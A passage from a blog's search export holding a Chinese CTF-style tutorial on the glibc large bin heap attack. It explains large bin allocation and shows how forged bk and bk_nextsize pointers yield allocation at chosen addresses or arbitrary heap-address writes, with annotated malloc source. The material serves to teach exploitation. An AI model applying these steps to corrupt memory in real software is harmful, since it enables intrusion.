是如何申请到的呢?</p><p>源码中显示:</p><ol><li>首先通过申请的size找到index,进而找到指定的bin链</li><li>在找到bin链后,从最小的heap开始通过<code>bk_nextsize</code>找到第一个大于等于size的heap</li><li>在找到heap后,利用fd判断下一个heap的size是否于当前heap的size,如果相等,将下一个heap返回,这样可以减少设置链头的操作</li><li>利用unlink取下得到的heap</li><li>判断heap的size减去申请的size是否大于MINSIZE,如果大于就将其放入unsorted bin,如果小于,那么直接分配给用户</li></ol><p>这就是largebin的分配过程,那么largebin只有这一种被申请的方式吗?</p><p>如果在申请堆块的时候没有找到合适heap的时候,会从topchunk开始申请,在此之前,程序会遍历比当前index大的索引,如果在大于fastbin的范围内,存在heap,就会从中切割申请的大小,当前heap的size减去申请的size是否大于MINSIZE,如果大于就将其放入unsorted bin,如果小于,那么直接分配给用户。</p><p>即，如果在上述情况下申请0x60，就会从B中分配0x60，余下0x3e0归入unsorted bin</p><p><img src="/2020/04/02/LargebinAttack/image-20200402134441802.png" alt="image-20200402134441802"></p><p>这就是largebin在ptmalloc中的机制了。</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>那么large bin attack又是怎么进行的呢？</p><p>现在有两种常见的利用方式：</p><ul><li>在申请largebin的过程中，伪造largebin的<code>bk_nextsize</code>，实现非预期内存申请。</li><li>在largebin插入的过程中，伪造largebin的<code>bk_nextsize</code>以及<code>bk</code>，实现任意地址写堆地址。</li></ul><h3 id="申请时利用"><a href="#申请时利用" class="headerlink" title="申请时利用"></a>申请时利用</h3><p>在申请largebin的时候，从最小的heap开始，利用<code>bk_nextsize</code>寻找合适的heap，如果找到了合适的heap，就将其取出，那么如果我们将<code>bk_nextsize</code>指向其他地方，就可以申请到其他地方。<br>看下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize; <span class="comment">//寻找堆块</span></span><br><span class="line">                </span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//unlink</span></span><br></pre></td></tr></table></figure><p>所以只需要在目标地方符合unlink，那么就可以通过检查了。<br>举个例子：<br>申请一个largebin，之后free，再申请一个大堆块使之前堆块进入large bin：</p><p>申请A和底下分割的0x20，之后freeA，申请B和C。</p><p><img src="/2020/04/02/LargebinAttack/image-20200402155926664.png" alt="image-20200402155926664"></p><p>之后，我们开始利用，这里提供两种思路吧，但是其本质都是修改bk_nextsize。</p><ul><li><p>直接将bk_nextsize指向B的头</p></li><li><p>将bk_nextsize指向B的内容</p></li></ul><p>第一种和第二种本质上一样，但是第二种可以顺便利用unlink，向bss段上写一个bss段地址，这里假设bss段上存着堆地址，如果PIE开启了，就不好操作了，这里我们关掉PIE，演示第二种漏洞利用。<br>修改A的bk_nextsize，假设此时有UAF：<br>也就是将<code>bk_nextsize = B+0x10</code>，而B+0x10一般存在bss段上，所以，此时B上伪造以一个的<code>fd = bss - 0x18</code>,<code>bk= bss - 0x10</code>的堆块，这都属于unlink常规操作。注意伪造堆块的fd_nextsize要等于0，因为unlink有检查</p><p><img src="/2020/04/02/LargebinAttack/image-20200402171500760.png" alt="image-20200402171500760"></p><p>之后注意对于伪造堆块检查，即检查下一个堆块的pre_size。<br>最后得到：</p><p><img src="/2020/04/02/LargebinAttack/image-20200402173228230.png" alt="image-20200402173228230"></p><p>此时申请large bin ，就会得到fake B的内存区域。</p><h3 id="插入时利用"><a href="#插入时利用" class="headerlink" title="插入时利用"></a>插入时利用</h3><p>在申请大堆块后，unsorted bin不满足size要求，会将其放入large bin，此时，我们可以通过一些办法，达到一次任意地址写堆地址的目的，看代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">         bck = bin_at (av, victim_index); <span class="comment">//这个是main_arena的地址</span></span><br><span class="line">         fwd = bck-&gt;fd;<span class="comment">//这是最大size的链首</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">         <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">             <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">             <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">             assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">             <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)<span class="comment">//bck-&gt;bk是最小size的链首</span></span><br><span class="line">   &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk)) <span class="comment">//如果当前申请的size小于最小szie</span></span><br><span class="line">               &#123;</span><br><span class="line">                 fwd = bck;</span><br><span class="line">                 bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                 victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//这里不好整</span></span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span> <span class="comment">//如果当前申请的size不是最小的</span></span><br><span class="line">               &#123;</span><br><span class="line">                 assert (chunk_main_arena (fwd));</span><br><span class="line">                 <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd)) <span class="comment">//从最大块开始寻找一个小于szie的链</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd)) <span class="comment">// 如果找到的链和申请的size相同</span></span><br><span class="line">                   <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                   fwd = fwd-&gt;fd; </span><br><span class="line">                 <span class="keyword">else</span><span class="comment">//如果不同，则说明应该插在这个链前面</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     victim-&gt;fd_nextsize = fwd;<span class="comment">//小的链在victim上</span></span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//这里如果可以控制</span></span><br><span class="line">                     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//这里能写一个victim</span></span><br><span class="line">                   &#125;</span><br><span class="line">                 bck = fwd-&gt;bk;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">     mark_bin (av, victim_index);</span><br><span class="line">     victim-&gt;bk = bck;</span><br><span class="line">     victim-&gt;fd = fwd;</span><br><span class="line">     fwd-&gt;bk = victim;</span><br><span class="line">     bck-&gt;fd = victim;<span class="comment">//最后这里，还可以有一次写，如果fwd-&gt;bk可控</span></span><br></pre></td></tr></table></figure><p>可以看到，这段代码中有两次可以写入victim的地方，由于其比较简单，没啥检查，所以可以直接搞起：</p><p>搞到一块large bin 然后搞到一块更大的large bin，且其index一样。在得到这个large bin之前，先改写原本就在large bin中的堆块的bk或bk_nextsize。</p><p>举个例子：</p><p>首先申请3个chunk，free A堆块，之后申请更大的chunk</p><p><img src="/2020/04/02/LargebinAttack/image-20200402194349362.png" alt="image-20200402194349362"></p><p>此时A在large bin内，之后修改A的bk或bk_nextsize：</p><p><img src="/2020/04/02/LargebinAttack/image-20200402194649105.png" alt="image-20200402194649105"></p><p>修改上述的bk和bk_nextsize，后续就可以达到在target1和target2中写堆B地址的目的。</p><p>之后，free chunk B，然后申请大于等于0x480的堆块，比如申请malloc(0x470)，就可以达到漏洞利用目的了。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>文章首发于freebuf</p><p>如有错误欢迎指正：<a href="mailto:sofr@foxmail.com">sofr@foxmail.com</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://ray-cp.github.io/archivers/ptmalloc_argebin_attack" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/ptmalloc_argebin_attack</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
            <tag> largebin attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个flag</title>
      <link href="/2020/04/01/flag/"/>
      <url>/2020/04/01/flag/</url>
      
        <content type="html"><![CDATA[<p>搞个博客，常常更新自己的学习进度，督促自己学习，加油！！！flag立起来吧</p>]]></content>
      
      
      <categories>
          
          <category> personal </category>
          
      </categories>
      
      
        <tags>
            
            <tag> personal </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
